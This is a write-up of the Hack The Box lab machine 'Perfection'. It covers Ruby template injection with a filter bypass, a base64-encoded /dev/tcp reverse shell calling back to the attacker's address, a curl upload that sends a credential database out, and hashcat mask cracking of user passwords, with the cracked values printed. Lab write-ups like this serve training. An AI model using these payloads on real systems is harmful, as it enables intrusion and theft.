---
title:  "HTB Perfection Writeup"
date:   2024-03-03 00:30:00 
categories: HTB Machine
tags: SSTI ruby password_Cracking
---

![Perfection](/assets/img/Perfection/GHhQhYaXEAAlIvm.png)

## Introduction 

The initial access was quite clear the way you had to work but actually exploiting it required some tinkering. This gave me some practice in trying to evade malicious content filters as well as encoding techniques.

The root access was a quite interesting take as well as it forced the you to use the more advanced methods of hashcat to crack all the user passwords with a specific format. 

All in all I would call this a good box and recommend this machine especially for people that are more new to web application pentesting

If you like any of my content it would help a lot if you used my referral link to buy Hack The Box/Academy Subscriptions which you can find on my about page.

## Initial access
### Recon

To start off our recon we will begin with an Nmap scan of the machine. Using the following command:
```
sudo nmap -sS -A  -p-  -o nmap  10.129.38.85
```
**Nmap**
```
# Nmap 7.94 scan initiated Tue Mar  5 12:33:21 2024 as: nmap -sS -A -p- -o nmap 10.129.38.85
Nmap scan report for 10.129.38.85
Host is up (0.035s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
80/tcp open  http    nginx
|_http-title: Weighted Grade Calculator
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=3/5%OT=22%CT=1%CU=40934%PV=Y%DS=2%DC=T%G=Y%TM=65E7577D
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11
OS:NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT      ADDRESS
1   77.99 ms 10.10.16.1
2   17.13 ms 10.129.38.85

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar  5 12:33:49 2024 -- 1 IP address (1 host up) scanned in 28.65 seconds
```

When reviewing the Nmap output we can see that this machine only has a web service and SSH open.This makes it quite obvious that this machine will have something to do with the webservice. When looking at this webservice we could see a weighted grade calculator which returned the users input when you fully complete each field in a valid way.

![Perfection](/assets/img/Perfection/Perfection_01.png)

### Server Side Template Injection

Seeing this my first instinct was that there might be some injection attack or server side template injection. When looking deeper into the responses the server returned we could see that **WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)** server was being used, this gives me an indication that we might be dealing with server side template injection using Ruby.

```
HTTP/1.1 200 OK
Server: nginx
Date: Tue, 05 Mar 2024 18:31:44 GMT
Content-Type: text/html;charset=utf-8
Connection: close
X-Xss-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Server: WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)
Content-Length: 5299

<html lang="en">
<head>
<title>Weighted Grade Calculator</title>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="/css/w3.css">
<link rel="stylesheet" href="/css/lato.css">
<link rel="stylesheet" href="/css/montserrat.css">
<link rel="stylesheet" href="/css/font-awesome.min.css">
<style>

<snipped>
```

So to test for server side template injection i injected the **<%=\{\{7*7\}\}%>** into the first category. This would make the the browser send the following request. Noteworthy is that the browser automatically url encodes all the special characters in here. This gives me an indication that whatever i put in here will need to be url encoded.
```
POST /weighted-grade-calc HTTP/1.1
Host: 10.129.38.85
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 205
Origin: http://10.129.38.85
Connection: close
Referer: http://10.129.38.85/weighted-grade-calc
Upgrade-Insecure-Requests: 1

category1=%3C%25%3D%7B%7B7*7%7D%7D%25%3E&grade1=11&weight1=20&category2=test1&grade2=1&weight2=20&category3=test2&grade3=2&weight3=20&category4=test3&grade4=3&weight4=20&category5=test4&grade5=8&weight5=20
```

In the response below we can see that the application detected some malicious content. This tells us its trying to check the content so we need to find some way to bypass this.

![Malicious input detected](/assets/img/Perfection/Perfection_02.png)


So to try and bypass this defense mechanism i ended trying putting a line feed (%0A) symbol before our actual payload. This wouldn't render our server side template injection but it would crash the page which is a step closer to figuring this out. The browser would send the following request

```
POST /weighted-grade-calc HTTP/1.1
Host: 10.129.38.85
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 212
Origin: http://10.129.38.85
Connection: close
Referer: http://10.129.38.85/weighted-grade-calc
Upgrade-Insecure-Requests: 1

category1=test%0A%3C%25%3D%7B%7B7*7%7D%7D%25%3E&grade1=11&weight1=20&category2=test1&grade2=1&weight2=20&category3=test2&grade3=2&weight3=20&category4=test3&grade4=3&weight4=20&category5=test4&grade5=8&weight5=
```

![Service crashed](/assets/img/Perfection/Perfection_03.png)

So this could be that the Server Side Template Injection is actually working but the front end is not able to return it. To prove this theory i'd replace my payload to something that does a web request to our own server. With the following payload we would be able to send a curl request to our own machine 

```ruby
<%= system("curl http://10.10.16.42/10")%>
```

This command would not work because of the encoding so next up is the command with the right encoding

```
a%0A%3c%25%3d%20system%28%22curl%20http%3a//10.10.16.42/10%22%29%25%3e
```

The browser would then send the following request

```
POST /weighted-grade-calc HTTP/1.1
Host: 10.129.38.85
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 244
Origin: http://10.129.38.85
Connection: close
Referer: http://10.129.38.85/weighted-grade-calc
Upgrade-Insecure-Requests: 1

category1=a%0A%3c%25%3d%20system%28%22curl%20http%3a//10.10.16.42/10%22%29%25%3e&grade1=1&weight1=20&category2=test1&grade2=2&weight2=20&category3=test2&grade3=5&weight3=20&category4=test3&grade4=5&weight4=20&category5=test4&grade5=6&weight5=20
```

Then immediately we'd get a callback on our webserver showing that this curl command was indeed working.

![URL callback](/assets/img/Perfection/Perfection_04.png)


So our next step is to create a reverse shell. For less issues with syntax i opted to use a base64 encoded reverse shell.

```bash
echo -n '/bin/bash -l > /dev/tcp/10.10.16.42/443 0<&1 2>&1' | base64

```

this command gave us the following B64 encoded string 

```bash
L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTYuNDIvNDQzIDA8JjEgMj4mMQ==
```

Then using this B64 string our payload will look like this:

```bash
echo L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTYuNDIvNDQzIDA8JjEgMj4mMQ== | base64 --decode | bash
```

Now we need to properly URL encode this payload as well

```
a%0A%3c%25%3d%20system%28%22echo%20L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTYuNDIvNDQzIDA8JjEgMj4mMQ%3d%3d%20|%20base64%20%2d%2ddecode%20|%20bash
```
Before sending the payload don't forget to turn on your listener.

```bash
nc -lvp 443
```

After sending the following request we would get a reverse shell connecting back to our machine.

```
POST /weighted-grade-calc HTTP/1.1
Host: 10.129.38.85
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 334
Origin: http://10.129.38.85
Connection: close
Referer: http://10.129.38.85/weighted-grade-calc
Upgrade-Insecure-Requests: 1


category1=a%0A%3c%25%3d%20system%28%22echo%20L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTYuNDIvNDQzIDA8JjEgMj4mMQ%3d%3d%20|%20base64%20%2d%2ddecode%20|%20bash
%22%29%25%3e&grade1=1&weight1=20&category2=test1&grade2=2&weight2=20&category3=test2&grade3=5&weight3=20&category4=test3&grade4=5&weight4=20&category5=test4&grade5=6&weight5=20
```

![Shell as Susan](/assets/img/Perfection/Perfection_05.png)


## Privilege escalation

While looking through the file system i could found a database named **pupilpath_credentials.db** in the **/home/susan/Migration** directory. This is an Sqlite database and we can just send this one to our own machine for further analysis. First we need to setup our upload server using python.

```bash
python3 -m uploadserver 80
```

Next we upload the file using the following curl command  

```bash
curl -X POST http://10.10.16.42/upload -F files=@pupilpath_credentials.db
```

Now that we have access to this database file we could see whats in it. By running the following three commands i was able to see what tables are present and then proceeded to dump the users table. This table contained the password hashes of a couple of users.

```bash
sqlite3 pupilpath_credentials.db
.tables
SELECT * FROM users;
```

![Hashes dumped](/assets/img/Perfection/Perfection_06.png)

Looking at the hashes disclosed i could see that this was using the sha256 algorithm.

```
1|Susan Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
2|Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
3|Harry Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
4|David Lawrence|ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
5|Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
```

When trying to crack these using rockyou i did not have any success. This made me believe that I might be missing some data still so i decided to dig deeper into the directory system. When looking through the system we can see that Susan has a mail located at **/var/spool/mail/susan**. This mail explained the new password scheme they created.

```
Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student
```

So based on this information we can craft a new wordlist where we create the right password format.

```
susan_nasus_
tina_anit_
harry_yrrah_
david_divad_
stephen_nehpets_
```

Now using the following hashcat command we can use appedn 1-10 digits at the end of our wordlist. This should generate all potential matches

```
hashcat -m 1400 -O -a 6 -w 4 hashes ./wordlist  --increment mode ?d?d?d?d?d?d?d?d?d?d
```

After a while we were able to crack the passwords of all the users users.
```
abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210
ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a:david_divad_274797280
154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8:stephen_nehpets_609653958
d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393:harry_yrrah_782072564
dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57:tina_anit_916066225
```

Now that we obtained the password of susan we were able to log in using ssh using **susan_nasus_413759210** after which we elevated ourselves to root

```bash
ssh susan@10.129.38.85
```

![Logged in as root](/assets/img/Perfection/Perfection_07.png)
